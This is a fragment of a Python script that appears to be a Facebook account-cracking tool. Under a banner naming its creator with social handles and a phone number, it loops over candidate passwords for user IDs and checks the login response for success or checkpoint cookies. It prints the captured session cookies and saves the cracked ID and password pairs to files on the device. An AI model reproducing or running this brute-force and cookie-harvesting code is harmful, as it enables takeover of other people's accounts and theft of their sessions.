...
╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░░░░░░╚═╝░╚════╝░
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > AJMIR HOSSAIN 
\033[1;91m[✓] FACEBOOK  > DX AJMIR HOSSAIN 
\033[1;91m[✓] GITHUB    > AK-40 
\033[1;91m[✓] WHATSAPP  > +8801813225678
\033[1;91m--------------------------------------------"""
loop = 0
oks = []
cps = []
...
def xr():
    ...
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in DX-Ajmir/ok.txt,DX-Ajmir/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92mDX-Ajmir-OK🔥\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES 💚\033[1;91m=\033[1;96m '+coki+'')                
                open('/sdcard/DX-Ajmir-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[DX-Ajmir-CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/DX-Ajmir-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97mDX-Ajmir\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
